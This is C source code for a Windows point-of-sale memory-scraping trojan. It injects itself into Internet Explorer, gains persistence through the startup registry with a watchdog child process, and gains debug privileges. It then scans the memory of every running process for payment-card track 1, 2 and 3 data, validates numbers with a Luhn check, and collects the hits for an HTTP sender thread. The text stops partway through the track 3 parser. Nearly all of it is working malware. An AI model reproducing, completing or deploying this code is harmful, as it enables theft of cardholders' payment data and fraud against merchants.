
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "Globals.h"
#include "Config.h"


#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "rpcrt4.lib")

#pragma comment(linker,"/ENTRY:_entryPoint")
#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/SECTION:.text,ERW")
//#pragma comment(linker,"/FIXED:NO")               
#pragma comment(linker,"/NODEFAULTLIB:LIBCMT")
#pragma comment(linker,"/NODEFAULTLIB:MSVCRT")
//#pragma comment(linker,"/FILEALIGN:0x200")c1

/*FIXME: For the pBlob use file mapping instead of heap, so if the process crashes, the child process can use the grabbed logs from the previos process*/
/*FIXME: Adding logging to files, if could not connect to server given amount of time and log to files on shutdown/reboot/log off, if there is no valid server */

#define HEAP_LFH 2

#define StaticCacheSize 2*40000
#define ReadLimit 100*4096 //6 zeroes - for ReadProcessMemory 
//#define RealBackLen 16
//#define RealForwardLenMin 10

//#define RealForwardLenMax 25
//#define TotalLen (RealBackLen + RealForwardLen + 1) //+1 for the '=' 
#define StaticBlobSize 40000
#define ReAllocChunk 10000 


#define T1MaxLen 79
#define T2MaxLen 40
#define T3MaxLen 107
#define MinimalEndData 15

BOOL bInjected = FALSE;
DWORD CurPID = 0;
DWORD ParentPID = 0;
DWORD ChildPID = 0;
DWORD hMutex = 0;
HANDLE hCacheMapping = NULL;

PROCESSENTRY32 ProcessInfo;
DWORD BlobSize,CacheSize;
char *pCacheMap,LastProcess[64];
BYTE *pGlobalBuf;

void GetDebugPrivs();
BOOL ScanMemory();
void ScanMemoryLoop();
BOOL IsPCx64();



void _entryPoint() { //Entry Point

	BYTE *pCommandLine;
	DWORD CSIDL;
	MEMORY_BASIC_INFORMATION MBI;
	char UpdateMutexString[64];
	HANDLE hUpdateMutexOne,hUpdateMutexTwo,hProcess;
	SECURITY_ATTRIBUTES sa;


	//Check if this is not update - first mutex is created by the new update bin, after its confirmed from the current running loader, he will create
	//one more mutex for which the update bin is waiting
	pCommandLine = GetCommandLine();
	if(pCommandLine!=NULL) {
		if(StrStr(pCommandLine,UpdateMutexMark)!=NULL) {
			hUpdateMutexOne = CreateMutex(NULL,FALSE,pCommandLine);

			//Create the string for the second mutex and wait for it to be created
			_memset(UpdateMutexString,0x00,sizeof(UpdateMutexString));
			wsprintf(UpdateMutexString,"%s%d",pCommandLine,GetCurrentProcessId());

			while(1) {
				SetLastError(ERROR_SUCCESS);

				hUpdateMutexTwo = CreateMutex(NULL,FALSE,UpdateMutexString);
				if(GetLastError()==ERROR_ALREADY_EXISTS) { //All went fine, close mutexes and kill the parent process

					CloseHandle(hUpdateMutexOne);
					CloseHandle(hUpdateMutexTwo);

					CSIDL = GetParentProcessId();
					if(CSIDL!=-1) { //Successfully acquired parent PID
					hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,CSIDL);
					TerminateProcess(hProcess,0);
					CloseHandle(hProcess);
					}

					break;
				}
				CloseHandle(hUpdateMutexTwo);
				Sleep(1000);
			}
		}
	}
	/////////////////////////////////////
	//////////////////////////////////////////////////////////////////////

	//This is loop for the process protect - child process loop, waiting the parent to die
	if(ParentPID!=0) {
		while(GetProcessVersion(ParentPID)!=0) {
			Sleep(2000);
		}
	}
	////////////////////////////////////////////

	if(hMutex==0) { //This wont be NULL, when we injected
	//Make sure that only one istance will run
	SetLastError(ERROR_SUCCESS);
	hMutex = (DWORD) CreateMutex(NULL,FALSE,MutexString);
	if(GetLastError()==ERROR_ALREADY_EXISTS) { ExitProcess(0); }
    ////////////////////////////////////////////////////////////////
    }

	//Get current pid, to prevent self-scanning
	CurPID = GetCurrentProcessId();

	//Heap init and config
	hHeap = GetProcessHeap();
	//hFlag = HEAP_LFH;
	//HeapSetInformation(hHeap,HeapCompatibilityInformation,&hFlag,sizeof(hFlag));
    //////////////////////////////////////////////

	IsWoW64ProcessX = (mIsWoW64Process) GetProcAddress(GetModuleHandle("kernel32.dll"),"IsWow64Process");
	//Check if injected
	if(bInjected==FALSE) { //Not injected - inject

		x64 = IsPCx64();

		//Get IE path
		_memset(IEPath,0x00,sizeof(IEPath));
	    if(x64==TRUE) { 
	    CSIDL = CSIDL_PROGRAM_FILESX86;
	    SHGetFolderPathW(NULL,CSIDL,NULL,SHGFP_TYPE_CURRENT,IEPath);
	    lstrcatW(IEPath,L"\\Internet Explorer\\iexplore.exe"); } //we are running on x64
	    else { CSIDL = CSIDL_PROGRAM_FILES;
	    SHGetFolderPathW(NULL,CSIDL,NULL,SHGFP_TYPE_CURRENT,IEPath);
	    lstrcatW(IEPath,L"\\Internet Explorer\\iexplore.exe"); } //we are running on x86
        ///////////////////////////////////////////////////////////////////////////////

		CurrentModule = (DWORD) GetModuleHandle(NULL);
		GetModuleFileNameW(NULL,OldLocation,sizeof(OldLocation));
		lstrcpyW(CurrentLocation,OldLocation);
		BeginInjection(FALSE);

	} //here we get the old full path, so we can delete it later
	else { //Injected - load dll's

		LoadLibrary("user32.dll");
		LoadLibrary("advapi32.dll");
		LoadLibrary("shell32.dll");
		LoadLibrary("urlmon.dll");
		LoadLibrary("wininet.dll");
		LoadLibrary("gdi32.dll");
		LoadLibrary("rpcrt4.dll");

		//Get module base
		_memset(&MBI,0x00,sizeof(MBI));
		VirtualQuery(_entryPoint,&MBI,sizeof(MBI));
		CurrentModule = (DWORD) MBI.AllocationBase;
	}


	//Check if infected
	if(CheckIfInfected()==FALSE) { Infect(); }

	//Disable open-file warning - at every start just for sure
	DisableOpenFileWarning();
	//////////////////////////////////////////

	//Needed for the GatherInfo / GetIdleTime
	_GetLastInputInfo = (__GetLastInputInfo) GetProcAddress(GetModuleHandle("user32.dll"),"GetLastInputInfo");

	//Try to acquire debug privilegs
	GetDebugPrivs();

	//Allocate blob to keep the grabbed dumps
	pBlob = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,StaticBlobSize);
	BlobSize = StaticBlobSize;
	GrowSize = 0;
	////////////////////////////////////////////////


	lstrcpy(LastProcess,"NoProcess");
	//Interval between each memory scan
	ScanInterval = MemoryScanInterval;
	//Interval between each connect to server
	ConnectInterval = HttpConnectInterval;

	//Init critical sections
	_memset(&crsBlob,0x00,sizeof(crsBlob));
	InitializeCriticalSection(&crsBlob);         //crsBlob - access the blob where the dumps are stored
	//////////////////////////////////////

	//Create events
	hConnectEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	hInteractEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	/////////////////////////////////

	//Generate random key for the xor encryption
	RandStrA(Key,5);
	_memset(EncodedKey,0x00,sizeof(EncodedKey));
	base64_encode(Key,lstrlen(Key),EncodedKey,sizeof(EncodedKey));

	//Create file mapping for caching track2 CRC32's
	if(hCacheMapping==NULL) { //The mapping is not created yet, create it.
	sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

	hCacheMapping = CreateFileMapping(INVALID_HANDLE_VALUE,&sa,PAGE_READWRITE,0,StaticCacheSize,NULL);
	pCacheMap = MapViewOfFile(hCacheMapping,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
	_memset(pCacheMap,0x00,StaticCacheSize);
	} else { //File mapping already exists, just map it
		pCacheMap = MapViewOfFile(hCacheMapping,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
		//MessageBox(NULL,pCacheMap,NULL,MB_OK);
	}
	CacheSize = 0;
	/////////////////////////////////////////////////////////////

	//Start child for process protection
	BeginInjection(TRUE);

	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MonitorShutdown,NULL,0,NULL);

	pGlobalBuf = VirtualAlloc(NULL,ReadLimit+4096,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)HttpInteract,NULL,0,NULL);
	//SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_IDLE); 
	//ScanMemory(); //Scan the memory before connecting to the http server so we grab data ultimately
	//Start creating threads

	hThreadScan = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ScanMemoryLoop,NULL,0,NULL);
	//SetThreadPriority(hThreadScan, THREAD_PRIORITY_IDLE); //Lowers the CPU usage when scanning the memory
	hThreadRegistry = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ProtectRegistry,NULL,0,NULL); //Thread that waits for change in the startup registry to restore them
	hThreadChild = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MonitorChild,NULL,0,NULL);    //Thread that checks if child is dead to restart it

    //SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

	HttpMain();
}

void ScanMemoryLoop() {

	DWORD dWait;

	while(1) {

		ScanMemory();
		dWait = ScanInterval;
		Sleep(dWait);
	}
}

LRESULT CALLBACK DetectShutdown(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {

	if(message==WM_QUERYENDSESSION || lParam==ENDSESSION_LOGOFF) {

	SetEvent(hConnectEvent);
	Sleep(2000);
	return TRUE; 
	}
	else { return DefWindowProc(hWnd, message, wParam, lParam); }

	return 0;
}


BOOL SkipProcess(char *ProcName);

void TrackSearch(char *pBuf,DWORD RealBufSize);
void TrackSearchNoSentinels(char *pBuf,DWORD RealBufSize);

BOOL ScanMemory() {

	HANDLE hProcess,hProcesses;
	MEMORY_BASIC_INFORMATION MBI;
	BYTE *Buf;
	DWORD ReadAddr,QueryAddr,BytesRead,BufSize;
	BOOL bRet,pBool;


	bRet = FALSE;
	_memset(&ProcessInfo,0x00,sizeof(ProcessInfo));
	ProcessInfo.dwSize = sizeof(PROCESSENTRY32);

	hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	Process32First(hProcesses,&ProcessInfo);
	do{ //Enumerate processes

	if(SkipProcess(ProcessInfo.szExeFile)==TRUE) { continue; }
	if(CurPID==ProcessInfo.th32ProcessID||CurPID==ProcessInfo.th32ParentProcessID) { continue; }

	hProcess = NULL;
	Sleep(10); //gives the CPU slice of time

	hProcess = OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,FALSE,ProcessInfo.th32ProcessID);
	if(hProcess==NULL) { continue; }

	if(x64==TRUE) { //we are running in WOW64 environment
		IsWoW64ProcessX(hProcess,&pBool);
		if(pBool==FALSE) { //This is x64 process
			CloseHandle(hProcess); 
			continue;
		}
	}
	

	QueryAddr = 0;
	while(1) { //Enumerate process memory regions

    //Sleep(1);
	_memset(&MBI,0x00,sizeof(MBI));
	VirtualQueryEx(hProcess,(LPVOID)QueryAddr,&MBI,sizeof(MBI));  //if its bigger than 1 0 000 000 bytes, read only that amount
	if(MBI.BaseAddress==0 && QueryAddr!=0) { break; } //memory regions finished

	QueryAddr += (DWORD) MBI.RegionSize;

	if(MBI.Protect&PAGE_NOACCESS || MBI.Protect&PAGE_GUARD /*|| MBI.Protect&PAGE_EXECUTE || MBI.Protect&PAGE_EXECUTE_READ || MBI.State&MEM_FREE*/) { continue; }

	ReadAddr = 0;
	while(MBI.RegionSize>0) {

	if(ReadAddr!=0) {
		ReadAddr+=ReadLimit;
	} else { 
		ReadAddr = (DWORD) MBI.BaseAddress;
	}

	if(MBI.RegionSize>ReadLimit) {

		BufSize = ReadLimit;
		MBI.RegionSize -= ReadLimit;

	} else {
		
		BufSize = MBI.RegionSize;
		MBI.RegionSize = 0;
	}

	BytesRead = 0;
	//Buf = HeapAlloc(hHeap,0,BufSize+100); //+100 just for in case

	//Buf = VirtualAlloc(NULL,BufSize+100,MEM_COMMIT,PAGE_READWRITE);
	Buf = pGlobalBuf;
	ReadProcessMemory(hProcess,(LPVOID)ReadAddr,Buf,BufSize,&BytesRead); //Common issue for dumpers, cuz you cant know if the memory region is not corrupted 
		//if(GetLastError()==ERROR_PARTIAL_COPY) { 	MessageBox(NULL,NULL,NULL,MB_OK); }

	

		//MessageBox(NULL,ProcessInfo.szExeFile,NULL,MB_OK);
		TrackSearch(Buf,BytesRead);
		TrackSearchNoSentinels(Buf,BytesRead);
	

	//VirtualFree(NULL,BufSize+100,PAGE_READWRITE);
	//HeapFree(hHeap,0,Buf);
	}

	} //enumerate memory loop

	CloseHandle(hProcess);

	//Sleep(50); //give the processor some rest - MAY HAVE TO INCREASE
	}while(Process32Next(hProcesses, &ProcessInfo)); //enumerate processes loop

	CloseHandle(hProcesses);


	return bRet;
}

void AddCache(BYTE *ptr, DWORD len) {

	BYTE *pTemp;

	//MessageBox(NULL,"Add Cache",NULL,MB_OK);
	if((CacheSize+len)>StaticCacheSize) {
		_memset(pCacheMap,0x00,CacheSize);
		CacheSize = 0;
	}

    pTemp = (pCacheMap+CacheSize);
	_memcpy(pTemp,ptr,len);
	CacheSize += len;
	
	//MessageBox(NULL,pCacheMap,NULL,MB_OK);
}

void AddItem(BYTE *ptr, DWORD len) {

	BYTE *pTempBlob,ProcessName[64];
	DWORD ProcessNameLen,NewSize;


	
	ProcessNameLen = (lstrlen(ProcessInfo.szExeFile)+lstrlen(LastProcess)+2); //+2 for the '|' and ':' marking symbols

	EnterCriticalSection(&crsBlob);

	GrowSize += len;
	
	if((GrowSize+ProcessNameLen)>BlobSize) { //Need to re-alloc
		
		//MessageBox(NULL,"Buffer Full",NULL,MB_OK);
		//pTempBlob = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,BlobSize+ReAllocChunk);
		NewSize = BlobSize+ReAllocChunk;
		pTempBlob = VirtualAlloc(NULL,NewSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

		_memcpy(pTempBlob,pBlob,BlobSize);

		VirtualFree(pBlob,BlobSize,MEM_FREE);
		//HeapFree(hHeap,HEAP_ZERO_MEMORY,pBlob);

		pBlob = pTempBlob;
		BlobSize = NewSize;
	} 

	if(lstrcmp(LastProcess,ProcessInfo.szExeFile)!=0 || GrowSize==len) { //if we enumare other process or we are starting logging new dumps

		lstrcpy(LastProcess,ProcessInfo.szExeFile); 
		ProcessNameLen = lstrlen(LastProcess)+2;

		_memset(ProcessName,0x00,sizeof(ProcessName));
		wsprintf(ProcessName,"|%s:",LastProcess);

		_memcpy(pBlob,ProcessName,ProcessNameLen);
		pBlob += ProcessNameLen;
		GrowSize += ProcessNameLen;
	} 

	_memcpy(pBlob,ptr,len);
	pBlob += len;

	LeaveCriticalSection(&crsBlob);

}

int IsValidCC(const char* cc,int CClen)
{
	const int m[] = {0,2,4,6,8,1,3,5,7,9}; // mapping for rule 3
	int i, odd = 1, sum = 0;
 
	for (i = CClen; i--; odd = !odd) {
		int digit = cc[i] - '0';
		sum += odd ? digit : m[digit];
	}
 
	return sum % 10 == 0;
}

BOOL IsDigit(char c) {

	if(c>=0x30 && c<=0x39) { return TRUE; } else { return FALSE; }
}

int DigitsLen(char *Str,BOOL bWCHAR,BOOL bSentinel) {

	int len;

	len = 0;

	while(IsDigit(*Str)==TRUE) {

		len++;

		
		if(bSentinel==TRUE) { //Searching with sentinels - from the beginning
		Str++;
		if(bWCHAR==TRUE) { Str++; }
		} else {  //Searching without sentinels - searching from the middle
		Str--;
		if(bWCHAR==TRUE) { Str--; }
		}

		if(len>19) { return -1; } //This is too over MaxLen
	}

	if(len!=15 && len!=16 && len!=19) { return -1; }

	return len;
}

BOOL IsNameChar(char c) {

	if((c>=0x41 && c<=0x5A)
	 ||(c>=0x61 && c<=0x7A)
	 ||c==' '||c=='^'||c=='/') {
		 
		 return TRUE; 
	} else { return FALSE; }
}

int Track1NameLength(char *Str,BOOL bWCHAR) {

	int len;

	len = 0;

	while(IsNameChar(*Str)==TRUE) {
		len++;
		Str++;
		if(bWCHAR==TRUE) { Str++; }
		if(len>26) { return -1; } //This is to over MaxLen
	}

	if(len<2 || len>26) { return -1; }

	return len;
}

int IsEndDataValid(char *Str,BOOL bWCHAR,BOOL bSentinel,int MaxValidLen) {

	int len;

	len = 0;

	while(IsDigit(*Str)==TRUE) {
		len++;
		Str++;
		if(bWCHAR==TRUE) { Str++; }
		if(len>MaxValidLen) { return -1; }
	}

	if(bSentinel==TRUE) {  // Check for '?', only when looking for sentinel
		if(*Str=='?') { len++;  if(len>=MinimalEndData) { return len; } else { return -1; } } else { return -1; }
	} else { if(len>=MinimalEndData) { return len; } else { return -1; } } //When there is no sentinel
}

void TrackSearchNoSentinels(char *pBuf,DWORD RealBufSize) {

	char *sBuf,*Buf,CC[20],Track1[T1MaxLen],Track2[T2MaxLen],*ptr;
	BOOL bWCHAR,bSentinel,bIncreased;
	DWORD len,TotalLen,decreased,CClen;


	bIncreased = FALSE;
	decreased = 0;
	while(RealBufSize>0) {

Check:
		Buf = pBuf;
		
		if(*Buf!=0x00 && *Buf<0x7F && *Buf>0x20) {

			//START SEARCHING WITHOUT SENTINELS
			if(*Buf=='^' && decreased>25) { //TRACK 1
				//bIncreased = FALSE;
				TotalLen = 0;
				Buf--; //back skip '^'
				sBuf = Buf;

				if(*Buf==0x00 && (IsDigit(*(--Buf))==TRUE)) {

					bWCHAR=TRUE;
					
				} else if(IsDigit(*sBuf)==TRUE) {

					bWCHAR=FALSE;
					
				} else { pBuf++; RealBufSize--; continue; } 
				bSentinel = FALSE;
				
				if((len = DigitsLen(Buf,bWCHAR,bSentinel))!=-1) { //valid CC length

					if(bWCHAR==FALSE) { Buf-=(len-1);  } else { Buf-=2*(len-1); } //-1 cuz otherwise we get 1 char before the CC
					sBuf = Buf;

					_memset(CC,0x00,sizeof(CC));
					if(bWCHAR==TRUE) {

						WideCharToMultiByte(CP_ACP,0,(WCHAR *)Buf,len,CC,sizeof(CC),NULL,NULL);

					} else {
					
						_memcpy(CC,Buf,len);
					}
					TotalLen += len; //for CC len
					CClen = len;
					

					if(IsValidCC(CC,len)==TRUE) {
						//MessageBox(NULL,"Valid CC",NULL,MB_OK);

						//Skip CC
						if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

						if(*Buf=='^') { //May be valid Track1 name

							//MessageBox(NULL,"May be valid Track1 name",NULL,MB_OK);
							if((len = Track1NameLength(Buf,bWCHAR))!=-1) {

								//MessageBox(NULL,"Valid Track1 name",NULL,MB_OK);

								//Skip Track1 name
								if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
								TotalLen += len; //for Track1 name

								if((len = IsEndDataValid(Buf,bWCHAR,bSentinel,(T1MaxLen-TotalLen)))!=-1) { //We have valid track 1
                                    
									//Skip track 1 end data
									if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
									TotalLen += len;

									_memset(Track1,0x00,sizeof(Track1));
									ptr = Track1;
									*ptr = '%';
									ptr++;
									*ptr = 'B';
									ptr++;
									if(bWCHAR==FALSE) { _memcpy(ptr,sBuf,TotalLen);  } 
									else { WideCharToMultiByte(CP_ACP,0,(WCHAR *)sBuf,TotalLen,ptr,sizeof(Track1),NULL,NULL); }

									ptr+=lstrlen(ptr);
									*ptr = '?';
	

								 if(StrStr(pCacheMap,Track1)==NULL) { //not logged 

								   //Sleep(1);
								 //MessageBox(NULL,"Add Item",NULL,MB_OK);
							       AddItem(Track1,TotalLen+3); 
								   AddCache(Track1,TotalLen+3);

								   TotalLen -= CClen;
								   if(bWCHAR==FALSE) { pBuf += TotalLen; RealBufSize -= TotalLen; } else { pBuf += 2*TotalLen ; RealBufSize -= 2*TotalLen; }
								   bIncreased = TRUE;
								   //MessageBoxW(NULL,pBuf,NULL,MB_OK);
					               //OutputDebugString("After bIncreased");
							      }
									//printf("%s\n",Track1);
								}
							}
						}
					} 
				}
			}

			
			if((*Buf=='=' || *Buf=='D') && decreased>25) { //TRACK 2
				//bIncreased = FALSE;
				TotalLen = 0;
				Buf--; //back skip '='
				sBuf = Buf;

				if(*Buf==0x00 && (IsDigit(*(--Buf))==TRUE)) {

					//MessageBox(NULL,"May be WCHAR track1 backlen",NULL,MB_OK);
					bWCHAR=TRUE;

				} else if(IsDigit(*sBuf)==TRUE) {

					//MessageBox(NULL,"May be char track1 backlen",NULL,MB_OK);
					bWCHAR=FALSE;
				} else { pBuf++; RealBufSize--; continue; } 
				bSentinel = FALSE;

				if((len = DigitsLen(Buf,bWCHAR,bSentinel))!=-1) { //valid CC length

					if(bWCHAR==FALSE) { Buf-=(len-1);  } else { Buf-=2*(len-1);  } //-1 cuz otherwise we get 1 char before the CC
					sBuf = Buf;

					_memset(CC,0x00,sizeof(CC));
					if(bWCHAR==TRUE) {

						WideCharToMultiByte(CP_ACP,0,(WCHAR *)Buf,len,CC,sizeof(CC),NULL,NULL);

					} else {
					
						_memcpy(CC,Buf,len);
					}
					TotalLen += len; //for CC len
					CClen = len;
					

					if(IsValidCC(CC,len)==TRUE) {
						//MessageBox(NULL,"Valid CC",NULL,MB_OK);

						//Skip CC
						if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

						if(*Buf=='=' || *Buf=='D') { //May be valid Track2

							if(bWCHAR==FALSE) { Buf++; } else { Buf += 2; }
							TotalLen += 1;

								if((len = IsEndDataValid(Buf,bWCHAR,bSentinel,(T2MaxLen-TotalLen)))!=-1) { //We have valid track 1
                                    
									//Skip track 2 end data
									if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
									TotalLen += len;

									_memset(Track2,0x00,sizeof(Track2));
									ptr = Track2;
									*ptr = ';';
									ptr++;
									if(bWCHAR==FALSE) { _memcpy(ptr,sBuf,TotalLen);  } 
									else { WideCharToMultiByte(CP_ACP,0,(WCHAR *)sBuf,TotalLen,ptr,sizeof(Track2),NULL,NULL); }

									ptr+=lstrlen(ptr);
									*ptr = '?';
	

								 if(StrStr(pCacheMap,Track2)==NULL) { //not logged 

								   //Sleep(1);
								   //MessageBox(NULL,Track2,NULL,MB_OK);
								   //Corrupt
							       AddItem(Track2,TotalLen+2); 
								   AddCache(Track2,TotalLen+2);

								   TotalLen -= CClen;
								   if(bWCHAR==FALSE) { pBuf += TotalLen; RealBufSize -= TotalLen; } else { pBuf += 2*TotalLen; RealBufSize -= 2*TotalLen; }
								   bIncreased = TRUE;
								  // MessageBoxW(NULL,pBuf,NULL,MB_OK);

							      }
									
							}
						}
					} 
				}
			}

		} //if(*Buf<0x7F && *Buf>0x20)
		if(bIncreased==TRUE) { bIncreased=FALSE; goto Check; } //We just found dump, and increased over it, dont skip that char after the dump
		pBuf++;
		RealBufSize--;
		decreased++;
	} //while(BufSize>0) 
}

void TrackSearch(char *pBuf,DWORD RealBufSize) { 

	char *sBuf,*Buf,CC[20],Track1[T1MaxLen],Track2[T2MaxLen],Track3[T3MaxLen];
	BOOL bWCHAR,bSentinel,bIncreased;
	DWORD len,TotalLen;


	bIncreased = FALSE;
	while(RealBufSize>0) {

Check:
		Buf = pBuf;
		if(*Buf!=0x00 && *Buf<0x7F && *Buf>0x20) {

			//Now start checking what kind of track is that
			if(*Buf=='%' && RealBufSize>T1MaxLen) { //Check if this is track1

				//bIncreased = FALSE;
				TotalLen = 0;
				Buf++; //skip '%'

				sBuf = Buf;
				if(*Buf==0x00 && (*(++Buf)=='B' || *Buf=='b')) { //May be WCHAR track1

					//MessageBox(NULL,"May be WCHAR track1",NULL,MB_OK);
					bWCHAR = TRUE;
					Buf+=2; //Skip 'B'

				} else if(*sBuf=='B' || *sBuf=='b') { //May be char track1

					//MessageBox(NULL,"May be char track1",NULL,MB_OK);
					bWCHAR = FALSE;
					Buf++; //Skip 'B'
					
				} else { pBuf++; RealBufSize--; continue; }
				TotalLen += 2; // for %B
			
				bSentinel = TRUE;
				if((len = DigitsLen(Buf,bWCHAR,bSentinel))!=-1) { //valid CC length
					//MessageBox(NULL,"Valid CC Length",NULL,MB_OK);

					_memset(CC,0x00,sizeof(CC));
					if(bWCHAR==TRUE) {

						WideCharToMultiByte(CP_ACP,0,(WCHAR *)Buf,len,CC,sizeof(CC),NULL,NULL);

					} else {
					
						_memcpy(CC,Buf,len);
					}
					TotalLen += len; //for CC len
					

					if(IsValidCC(CC,len)==TRUE) {
						//MessageBox(NULL,"Valid CC",NULL,MB_OK);

						//Skip CC
						if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

						if(*Buf=='^') { //May be valid Track1 name

							//MessageBox(NULL,"May be valid Track1 name",NULL,MB_OK);
							if((len = Track1NameLength(Buf,bWCHAR))!=-1) {

								//MessageBox(NULL,"Valid Track1 name",NULL,MB_OK);

								//Skip Track1 name
								if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
								TotalLen += len; //for Track1 name

								if((len = IsEndDataValid(Buf,bWCHAR,bSentinel,(T1MaxLen-TotalLen)))!=-1) { //We have valid track 1
                                    
									//Skip track 1 end data
									if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

									TotalLen += len;
									sBuf--; //cuz we skipped the % before we assigned this pointer

									_memset(Track1,0x00,sizeof(Track1));
									if(bWCHAR==FALSE) { _memcpy(Track1,sBuf,TotalLen);  } 
									else { WideCharToMultiByte(CP_ACP,0,(WCHAR *)sBuf,TotalLen,Track1,sizeof(Track1),NULL,NULL); }


									
								 if(StrStr(pCacheMap,Track1)==NULL) { //not logged 

								   //Sleep(1);
								   //MessageBox(NULL,Track1,NULL,MB_OK);
							       AddItem(Track1,TotalLen); 
								   AddCache(Track1,TotalLen);

								   if(bWCHAR==FALSE) { pBuf += TotalLen; RealBufSize -= TotalLen; } else { pBuf += 2*TotalLen ; RealBufSize -= 2*TotalLen; }
								   bIncreased = TRUE;
					               //OutputDebugString("After bIncreased");
							      }
									//printf("%s\n",Track1);
								}
							}
						}
					} 
				} 

			} //TACK 1
			

			if(*Buf==';' && RealBufSize>T2MaxLen) { //Check if this is track2

				//bIncreased = FALSE;
				TotalLen = 0;
				Buf++; //skip ';'

				sBuf = Buf;
				//Check is this WCHAR and first digit of CC 
				if(*Buf==0x00 && (IsDigit(*(++Buf))==TRUE)) {

					bWCHAR = TRUE;
				//	MessageBox(NULL,"May be WCHAR track2",NULL,MB_OK);
				} else if(IsDigit(*sBuf)==TRUE) {

					bWCHAR = FALSE;
				//	MessageBox(NULL,"May be WCHAR track2",NULL,MB_OK);
				} else { pBuf++; RealBufSize--; continue; }
				TotalLen += 1; //for ';'

				bSentinel = TRUE;
				if((len = DigitsLen(Buf,bWCHAR,bSentinel))!=-1) { //valid CC length
					//MessageBox(NULL,"Valid CC Length",NULL,MB_OK);

					_memset(CC,0x00,sizeof(CC));
					if(bWCHAR==TRUE) {

						WideCharToMultiByte(CP_ACP,0,(WCHAR *)Buf,len,CC,sizeof(CC),NULL,NULL);

					} else {
					
						_memcpy(CC,Buf,len);

					}
					TotalLen += len; //for CC len

					if(IsValidCC(CC,len)==TRUE) {
						//MessageBox(NULL,"Valid CC",NULL,MB_OK);

						//Skip CC
						if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

						if(*Buf=='=' || *Buf=='D') {

							if(bWCHAR==FALSE) { Buf++; } else { Buf += 2; }
							TotalLen += 1;

							if((len = IsEndDataValid(Buf,bWCHAR,bSentinel,(T2MaxLen-TotalLen)))!=-1) { //We have valid track 2

									//Skip track 2 end data
									if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
									TotalLen += len;

									sBuf--; //cuz we skipped the ; before we assigned this pointer

									_memset(Track2,0x00,sizeof(Track2));
									if(bWCHAR==FALSE) { _memcpy(Track2,sBuf,TotalLen);  } 
									else { WideCharToMultiByte(CP_ACP,0,(WCHAR *)sBuf,TotalLen,Track2,sizeof(Track2),NULL,NULL); }

									//MessageBox(NULL,Track2,NULL,MB_OK);
								  if(StrStr(pCacheMap,Track2)==NULL) { //not logged 

								   //Sleep(1);
								   //MessageBox(NULL,Track2,NULL,MB_OK);
								   //Corrupt
							       AddItem(Track2,TotalLen); 
								   AddCache(Track2,TotalLen);
						  
								   if(bWCHAR==FALSE) { pBuf += TotalLen; RealBufSize -= TotalLen; } else { pBuf += 2*TotalLen ; RealBufSize -= 2*TotalLen; }

								   bIncreased = TRUE;
							      }
							}

						}
					}

				}

			}// TRACK 2
			

			if((*Buf=='+' || *Buf=='!' || *Buf=='#') && RealBufSize>T3MaxLen) { //Check if this is track3

				//bIncreased = FALSE;
				TotalLen = 0;
				Buf++; //skip '+'

				sBuf = Buf;
				//Check is this WCHAR and first digit of track3
				if(*Buf==0x00 && (IsDigit(*(++Buf))==TRUE)) {
					
					bWCHAR = TRUE;
					
				} else if(IsDigit(*sBuf)==TRUE) {

					bWCHAR = FALSE;
					
				} else { pBuf++; RealBufSize--; continue; }


				//We are the first digit after + currently, check if next is digit too, since track3 has 2 digits after the + right before the CC
				if(bWCHAR==TRUE) {
					Buf += 2;
					if(IsDigit(*Buf)==FALSE) { pBuf++; RealBufSize--; continue; }
					Buf += 2;
					//MessageBox(NULL,"May be WCHAR track3",NULL,MB_OK);
				} else {
					Buf++;
					if(IsDigit(*Buf)==FALSE) { pBuf++; RealBufSize--; continue; }
					Buf++;
					//MessageBox(NULL,"May be WCHAR track3",NULL,MB_OK);
				}
				TotalLen += 3; //for the + and firt two digits

				bSentinel = TRUE;
				if((len = DigitsLen(Buf,bWCHAR,bSentinel))!=-1) { //valid CC length
					//MessageBox(NULL,"Valid CC Length",NULL,MB_OK);

					_memset(CC,0x00,sizeof(CC));
					if(bWCHAR==TRUE) {

						WideCharToMultiByte(CP_ACP,0,(WCHAR *)Buf,len,CC,sizeof(CC),NULL,NULL);
	
					} else {
					
						_memcpy(CC,Buf,len);
				
					}
					TotalLen += len; //for CC len

					if(IsValidCC(CC,len)==TRUE) {
						//MessageBox(NULL,"Valid CC",NULL,MB_OK);

						//Skip CC
						if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }

							if(*Buf=='=' || *Buf=='D') {

							if(bWCHAR==FALSE) { Buf++; } else { Buf += 2; }
							TotalLen += 1;

